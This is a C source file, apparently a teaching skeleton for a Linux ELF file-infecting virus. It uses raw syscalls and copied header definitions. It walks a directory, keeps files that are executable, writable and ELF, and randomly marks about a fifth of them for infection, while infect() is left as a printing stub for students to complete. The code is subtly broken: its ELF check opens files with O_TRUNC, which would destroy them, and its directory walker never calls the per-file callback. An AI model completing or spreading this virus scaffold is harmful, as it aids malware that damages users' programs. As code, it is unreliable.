#define _XOPEN_SOURCE 500

#define ROOT_DIR   (".")
#define SPARE_FDS  (4)
#define MAX_FDS	(512)

#define DEBUG 	1

// types.h

typedef unsigned int size_t;

typedef unsigned long int uintptr; /* size_t */
typedef long int intptr; /* ssize_t */

// end types.h

uintptr my_strlen(char const* str);
void infect(const char* fpath);

// elf.h

#define EI_NIDENT	16

/* 64-bit ELF base types. */
typedef unsigned long long	Elf64_Addr;
typedef unsigned short	Elf64_Half;
typedef signed short	Elf64_SHalf;
typedef unsigned long long	Elf64_Off;
typedef signed int	Elf64_Sword;
typedef unsigned int	Elf64_Word;
typedef unsigned long long	Elf64_Xword;
typedef signed long long	Elf64_Sxword;

typedef struct elf64_hdr {
  unsigned char	e_ident[EI_NIDENT];	/* ELF "magic number" */
  Elf64_Half e_type;
  Elf64_Half e_machine;
  Elf64_Word e_version;
  Elf64_Addr e_entry;		/* Entry point virtual address */
  Elf64_Off e_phoff;		/* Program header table file offset */
  Elf64_Off e_shoff;		/* Section header table file offset */
  Elf64_Word e_flags;
  Elf64_Half e_ehsize;
  Elf64_Half e_phentsize;
  Elf64_Half e_phnum;
  Elf64_Half e_shentsize;
  Elf64_Half e_shnum;
  Elf64_Half e_shstrndx;
} Elf64_Ehdr;

#define	ELFMAG0		0x7f		// EI_MAG
#define	ELFMAG1		'E'
#define	ELFMAG2		'L'
#define	ELFMAG3		'F'
#define	ELFMAG		"\177ELF"

// end elf.h


// resource.h

#define	RLIMIT_OFILE	8

struct rlimit {
	unsigned long	rlim_cur;		/* current (soft) limit */
	unsigned long	rlim_max;		/* maximum value for rlim_cur */
};

// end resource.h

// dirent.h

struct linux_dirent {
	unsigned long  d_ino;	 /* Inode number */
	unsigned long  d_off;	 /* Offset to next linux_dirent */
	unsigned short d_reclen;  /* Length of this linux_dirent */
	char		   d_name[];  /* Filename (null-terminated) */
						/* length is actually (d_reclen - 2 -
						   offsetof(struct linux_dirent, d_name) */
	/*
	char		   pad;	   // Zero padding byte
	char		   d_type;	// File type (only since Linux 2.6.4;
							  // offset is (d_reclen - 1))
	*/

};

// end dirent.h

// syscall.h
#define SYS_READ	0
#define SYS_WRITE   1
#define SYS_OPEN	2
#define SYS_CLOSE   3
#define SYS_STAT	4
#define SYS_FSTAT   5
#define SYS_MMAP	9
#define SYS_GETPID  39
#define SYS_GETDENTS	78
#define SYS_GETCWD  79
#define SYS_GETRLIMIT   97
#define SYS_PTRACE  101
#define SYS_GETUID  102
#define SYS_GETGID  104
#define SYS_GETEUID 107
#define SYS_GETEGID 108
#define SYS_GETPPID 110
#define SYS_GETPGRP 111
#define SYS_GETDENTS64  217

intptr read(int fd, char *buf, uintptr nbytes);
intptr write(int fd, void const* data, uintptr nbytes);
intptr open3(const char *filename, intptr flags, intptr mode);
intptr open(const char *filename, intptr flags);
intptr close(int fd);
intptr getuid();
intptr getrlimit(unsigned int resource, struct rlimit *rlim);
intptr getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
intptr getdents64(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
intptr getcwd(char *buf, unsigned long size);

void* syscall5(
	void* number,
	void* arg1,
	void* arg2,
	void* arg3,
	void* arg4,
	void* arg5
);

void* syscall4(
	void* number,
	void* arg1,
	void* arg2,
	void* arg3,
	void* arg4
);

void* syscall3(
	void* number,
	void* arg1,
	void* arg2,
	void* arg3
);

void* syscall2(
	void* number,
	void* arg1,
	void* arg2
);

void* syscall1(
	void* number,
	void* arg1
);

void* syscall(
	void* number
);

// end syscall.h

// stdio.h

#define NULL	0
int my_memcmp(const unsigned char *str1, const unsigned char *str2, size_t count);

// end stdio.h

// stat.h

typedef unsigned long	dev_t;
typedef unsigned long	ino_t;

typedef	unsigned long	mode_t;			/* (historical version) */
typedef	unsigned long	nlink_t;		/* (historical version) */
typedef	long	pid_t;			/* (historical version) */
typedef	long	uid_t;

typedef	uid_t	gid_t;

typedef long long	off_t;

typedef	long		time_t;

struct stat
{
	dev_t	st_dev;			/* inode's device */
	ino_t	st_ino;			/* inode's number */
	mode_t	st_mode;		/* inode protection mode */
	nlink_t	st_nlink;		/* number of hard links */
	uid_t	st_uid;			/* user ID of the file's owner */
	gid_t	st_gid;			/* group ID of the file's group */
	dev_t	st_rdev;		/* device type */
	off_t	st_size;		/* file size, in bytes */
	time_t	st_atime;		/* time of last access */
	long	st_spare1;
	time_t	st_mtime;		/* time of last data modification */
	long	st_spare2;
	time_t	st_ctime;		/* time of last file status change */
	long	st_spare3;
	long	st_blksize;		/* optimal blocksize for I/O */
	long	st_blocks;		/* blocks allocated for file */
	unsigned long	st_flags;		/* user defined flags for file */
	unsigned long	st_gen;			/* file generation number */
};

#define	S_ISUID	0004000			/* set user id on execution */
#define	S_ISGID	0002000			/* set group id on execution */
#define	S_ISTXT	0001000			/* sticky bit */

#define	S_IRWXU	0000700			/* RWX mask for owner */
#define	S_IRUSR	0000400			/* R for owner */
#define	S_IWUSR	0000200			/* W for owner */
#define	S_IXUSR	0000100			/* X for owner */\

#define	S_IRWXG	0000070			/* RWX mask for group */
#define	S_IRGRP	0000040			/* R for group */
#define	S_IWGRP	0000020			/* W for group */
#define	S_IXGRP	0000010			/* X for group */

#define	S_IRWXO	0000007			/* RWX mask for other */
#define	S_IROTH	0000004			/* R for other */
#define	S_IWOTH	0000002			/* W for other */
#define	S_IXOTH	0000001			/* X for other */

// end stat.h

// fcntl.h

#define	O_RDONLY	0x0000		/* open for reading only */
#define	O_WRONLY	0x0001		/* open for writing only */
#define	O_RDWR		0x0002		/* open for reading and writing */
#define	O_ACCMODE	0x0003		/* mask for above modes */

#define O_CREAT		00000100	/* not fcntl */
#define O_EXCL		00000200	/* not fcntl */
#define O_NOCTTY	00000400	/* not fcntl */
#define O_TRUNC		00001000	/* not fcntl */
#define O_APPEND	00002000
#define O_NONBLOCK	00004000
#define O_DSYNC		00010000	/* used to be O_SYNC, see below */
#define FASYNC		00020000	/* fcntl, for BSD compatibility */
#define O_DIRECT	00040000	/* direct disk access hint */
#define O_LARGEFILE	00100000
#define O_DIRECTORY	00200000	/* must be a directory */
#define O_NOFOLLOW	00400000	/* don't follow links */
#define O_NOATIME	01000000
#define O_CLOEXEC	02000000	/* set close_on_exec */

// end fcntl.h

// ftw.h

/*
 * Valid flags for the 3rd argument to the function that is passed as the
 * second argument to ftw(3) and nftw(3).  Say it three times fast!
 */
#define	FTW_F		0	/* File.  */
#define	FTW_D		1	/* Directory.  */
#define	FTW_DNR		2	/* Directory without read permission.  */
#define	FTW_DP		3	/* Directory with subdirectories visited.  */
#define	FTW_NS		4	/* Unknown type; stat() failed.  */
#define	FTW_SL		5	/* Symbolic link.  */
#define	FTW_SLN		6	/* Sym link that names a nonexistent file.  */

/*
 * Flags for use as the 4th argument to nftw(3).  These may be ORed together.
 */
#define	FTW_PHYS	0x01	/* Physical walk, don't follow sym links.  */
#define	FTW_MOUNT	0x02	/* The walk does not cross a mount point.  */
#define	FTW_DEPTH	0x04	/* Subdirs visited before the dir itself. */
#define	FTW_CHDIR	0x08	/* Change to a directory before reading it. */

struct FTW {
	int base;
	int level;
};

// end ftw.h

// fts.h

typedef struct _fts {
	struct _ftsent *fts_cur;	/* current node */
	struct _ftsent *fts_child;	/* linked list of children */
	struct _ftsent **fts_array;	/* sort array */
	dev_t fts_dev;			/* starting device # */
	char *fts_path;			/* path for this descent */
	int fts_rfd;			/* fd for root */
	int fts_pathlen;		/* sizeof(path) */
	int fts_nitems;			/* elements in the sort array */
	int (*fts_compar)();		/* compare function */

#define	FTS_COMFOLLOW	0x001		/* follow command line symlinks */
#define	FTS_LOGICAL	0x002		/* logical walk */
#define	FTS_NOCHDIR	0x004		/* don't change directories */
#define	FTS_NOSTAT	0x008		/* don't get stat info */
#define	FTS_PHYSICAL	0x010		/* physical walk */
#define	FTS_SEEDOT	0x020		/* return dot and dot-dot */
#define	FTS_XDEV	0x040		/* don't cross devices */
#define	FTS_WHITEOUT	0x080		/* return whiteout information */
#define	FTS_OPTIONMASK	0x0ff		/* valid user option mask */

#define	FTS_NAMEONLY	0x100		/* (private) child names only */
#define	FTS_STOP	0x200		/* (private) unrecoverable error */
	int fts_options;		/* fts_open options, global flags */
} FTS;

typedef struct _ftsent {
	struct _ftsent *fts_cycle;	/* cycle node */
	struct _ftsent *fts_parent;	/* parent directory */
	struct _ftsent *fts_link;	/* next file in directory */
	long fts_number;			/* local numeric value */
	void *fts_pointer;			/* local address value */
	char *fts_accpath;		/* access path */
	char *fts_path;			/* root path */
	int fts_errno;			/* errno for this node */
	int fts_symfd;			/* fd for symlink */
	unsigned short fts_pathlen;		/* strlen(fts_path) */
	unsigned short fts_namelen;		/* strlen(fts_name) */

	ino_t fts_ino;			/* inode */
	dev_t fts_dev;			/* device */
	nlink_t fts_nlink;		/* link count */

#define	FTS_ROOTPARENTLEVEL	-1
#define	FTS_ROOTLEVEL		 0
	short fts_level;		/* depth (-1 to N) */

#define	FTS_D		 1		/* preorder directory */
#define	FTS_DC		 2		/* directory that causes cycles */
#define	FTS_DEFAULT	 3		/* none of the above */
#define	FTS_DNR		 4		/* unreadable directory */
#define	FTS_DOT		 5		/* dot or dot-dot */
#define	FTS_DP		 6		/* postorder directory */
#define	FTS_ERR		 7		/* error; errno is set */
#define	FTS_F		 8		/* regular file */
#define	FTS_INIT	 9		/* initialized only */
#define	FTS_NS		10		/* stat(2) failed */
#define	FTS_NSOK	11		/* no stat(2) requested */
#define	FTS_SL		12		/* symbolic link */
#define	FTS_SLNONE	13		/* symbolic link without target */
#define	FTS_W		14		/* whiteout object */
	unsigned short fts_info;		/* user flags for FTSENT structure */

#define	FTS_DONTCHDIR	 0x01		/* don't chdir .. to the parent */
#define	FTS_SYMFOLLOW	 0x02		/* followed a symlink to get here */
#define	FTS_ISW		 0x04		/* this is a whiteout object */
	unsigned short fts_flags;		/* private flags for FTSENT structure */

#define	FTS_AGAIN	 1		/* read node again */
#define	FTS_FOLLOW	 2		/* follow symbolic link */
#define	FTS_NOINSTR	 3		/* no instructions */
#define	FTS_SKIP	 4		/* discard node */
	unsigned short fts_instr;		/* fts_set() instructions */

	struct stat *fts_statp;		/* stat(2) information */
	char fts_name[1];		/* file name */
} FTSENT;

// end fts.h

// limits.h

#define	_POSIX_OPEN_MAX		20
#define OPEN_MAX			_POSIX_OPEN_MAX

// end limits.h

// fs.h

#define DT_UNKNOWN	0
#define DT_FIFO		1
#define DT_CHR		2
#define DT_DIR		4
#define DT_BLK		6
#define DT_REG		8
#define DT_LNK		10
#define DT_SOCK		12
#define DT_WHT		14

// end fs.h

// syscall.c

intptr read(int fd, char *buf, uintptr nbytes)
{
	return (intptr)
		syscall3(
			(void*)SYS_READ,
			(void*)(intptr)fd,
			(void*)buf,
			(void*)nbytes
		);
}

intptr write(int fd, void const* data, uintptr nbytes)
{
	return (intptr)
		syscall3(
			(void*)SYS_WRITE,
			(void*)(intptr)fd,
			(void*)data,
			(void*)nbytes
		);
}

intptr open3(const char *filename, intptr flags, intptr mode)
{
	return (intptr)
		syscall3(
			(void*)SYS_OPEN,
			(void*)filename,
			(void*)flags,
			(void*)mode
		);
}

intptr open(const char *filename, intptr flags)
{
	return (intptr)
		syscall2(
			(void*)SYS_OPEN,
			(void*)filename,
			(void*)flags
		);
}

intptr close(int fd)
{
	return (intptr)
		syscall1(
			(void*)SYS_CLOSE,
			(void*)(intptr)fd
		);
}

intptr getuid()
{
	return (intptr)
		syscall(
			(void*)SYS_GETUID
		);
}

intptr getrlimit(unsigned int resource, struct rlimit *rlim)
{
	return (intptr)
		syscall2(
			(void*)SYS_GETRLIMIT,
			(void*)(unsigned long)resource,
			(void*)rlim
		);
}

intptr getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	return (intptr)
		syscall3(
			(void*)SYS_GETDENTS,
			(void*)(unsigned long)fd,
			(void*)dirp,
			(void*)(unsigned long)count
		);
}

intptr getdents64(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	return (intptr)
		syscall3(
			(void*)SYS_GETDENTS64,
			(void*)(unsigned long)fd,
			(void*)dirp,
			(void*)(unsigned long)count
		);
}

intptr getcwd(char *buf, unsigned long size)
{
	return (intptr)
		syscall2(
			(void*)SYS_GETCWD,
			(void*)buf,
			(void*)size
		);
}

// end syscall.c

// stdio.c

int my_memcmp(const unsigned char *str1, const unsigned char *str2, size_t count)
{
  register const unsigned char *s1 = (const unsigned char*)str1;
  register const unsigned char *s2 = (const unsigned char*)str2;

  while (count-- > 0)
	{
	  if (*s1++ != *s2++)
	  return s1[-1] < s2[-1] ? -1 : 1;
	}
  return 0;
}

// end stdio.c

// resource.c

int getdtablesize()
{
	struct rlimit r;
	if (getrlimit(RLIMIT_OFILE, &r) < 0) {
		return -1;
	}
	return r.rlim_cur;
}

// end resource.c

// nftw.c

int nftw(const char *path, int (*fn)(const char *, const struct stat *, int, struct FTW *), int nfds)
{
	//char * const paths[2] = { (char *)path, NULL };
	int fd;
	int nread;
	char buf[32768];
	char cwd_buf[1024];
	struct linux_dirent *d;
	int bpos;
	char d_type;

	if((fd = open(path, O_RDONLY | O_DIRECTORY)) < 0) {
		return -1;
	}
	
	for ( ; ; ) {
		nread = getdents(fd, (struct linux_dirent*)buf, 32768);
		if (nread == -1) {
			return -1;
		}

		if (nread == 0) {
			break;
		}
		getcwd(cwd_buf,1024);
		write(1,cwd_buf,my_strlen(cwd_buf));
		write(1, "\n", 1);
		write(1, "--------------- dirent -----------\n",my_strlen("--------------- dirent -----------\n"));
		write(1, "file type   d_name\n", my_strlen("file type   d_name\n"));
		for (bpos = 0; bpos < nread;) {
			d = (struct linux_dirent *) (buf + bpos);
			//write(1, "%8ld  ", d->d_ino);
			d_type = *(buf + bpos + d->d_reclen - 1);

			if(d_type == DT_REG) {
				write(1, "regular", my_strlen("regular"));
			} else if(d_type == DT_DIR) {
				write(1, "directory", my_strlen("directory"));
			} else if(d_type == DT_FIFO) {
				write(1, "FIFO", my_strlen("FIFO"));
			} else if(d_type == DT_SOCK) {
				write(1, "socket", my_strlen("socket"));
			} else if(d_type == DT_LNK) {
				write(1, "symlink", my_strlen("symlink"));
			} else if(d_type == DT_BLK) {
				write(1, "block dev", my_strlen("block dev"));
			} else if(d_type == DT_CHR) {
				write(1, "char dev", my_strlen("char dev"));
			} else if(d_type == DT_UNKNOWN) {
				write(1, "unknown", my_strlen("unknown"));
			} else {
				write(1, "???", my_strlen("???"));
			}
			//printf("%4d %10lld  %s\n", d->d_reclen,(long long) d->d_off, d->d_name);
			//write(1, "\t", 1);
			//char c = '0' + d_type / 100;
			//write(1, &c, 1);
			//c = '0' + (d_type / 10) % 10;
			//write(1, &c, 1);
			//c = '0' + d_type % 10;
			//write(1, &c, 1);
			write(1, "\t", 1);
			write(1, d->d_name, my_strlen(d->d_name));
			write(1, "\n", 1);
			bpos += d->d_reclen;
		}
	}

	return 0;
}

// end nftw.c
const unsigned char magic[] = {ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3};

void infect(const char* fpath);

int can_execute(const struct stat *sb, const char* fpath)
{
	return (sb->st_uid == getuid() && sb->st_mode & S_IXUSR)
		|| (sb->st_mode & S_IXOTH);
}

int can_write(const struct stat *sb, const char* fpath)
{
	return (sb->st_uid == getuid() && sb->st_mode & S_IWUSR)
		|| (sb->st_mode & S_IWOTH);
}

int is_elf(const char* fpath)
{
	Elf64_Ehdr header; // Assuming 64-bit ELF file.
	size_t nb;
	int ret = 0;
	//FILE* f;
	int f;

	//f = fopen(fpath, "rb");
	f = open(fpath, O_RDWR | O_TRUNC);
	//f = open(fpath, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
	if (!f) return 0;

	//nb = fread(&header, 1, sizeof(header), f);
	nb = read(f, (char*)&header, sizeof(header));
	if (nb == sizeof(header)) {
		if (my_memcmp(header.e_ident, magic, sizeof(magic)) == 0) {
			ret = 1;
		}
	}
	//fclose(f);
	close(f);

	return ret;
}

int random_pick()
{
	int rand = 0;
	int f;
	f = open("/dev/urandom", O_RDONLY);
	read(f, (char*)&rand, 1);
	close(f);
	
	if(DEBUG) {
		write(1, "[DEBUG] rand : ", my_strlen("[DEBUG] rand : "));
		char c = '0' + rand % 5;
		write(1, &c, 1);
		write(1, "\n", 1);
	}
	return rand % 5 == 0; // We infect roughly 1/5 of the binaries.
}

int file_process(const char *fpath,
				 const struct stat *sb,
				 int flag,
				 struct FTW *s)
{
	int ret = 0;

	if (flag == FTW_F
		&& can_execute(sb, fpath)
		&& can_write(sb, fpath)
		&& is_elf(fpath)
		&& random_pick())
	{
		infect(fpath);
	}

	return ret;
}

int main(int argc, char* argv[])
{
	//struct timeval t;
	int nfds = getdtablesize() - SPARE_FDS;
	if(nfds == -5) return -1;
	nfds = nfds > MAX_FDS ? MAX_FDS : nfds;

	//gettimeofday(&t, NULL);
	//srand(t.tv_usec * t.tv_sec);
	nftw(ROOT_DIR, file_process, nfds);
	//write(1, "hello from libc-free world\n", 27);
	return 0;
}

///////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////
//	  The above logic is an example, and you can freely modify it. Note that
//	  you should make the above logic work without calling libc functions.
///////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////

uintptr my_strlen(char const* str)
{
	char const* p;
	for (p = str; *p; ++p);
	return p - str;
}

// FIXME: your infection logic should be placed here and below.
void infect(const char* fpath)
{
	//printf("%s will be infected.\n", fpath);
	write(1, fpath, my_strlen(fpath));
	write(1, " will be infected.\n", my_strlen(" will be infected.\n"));
}

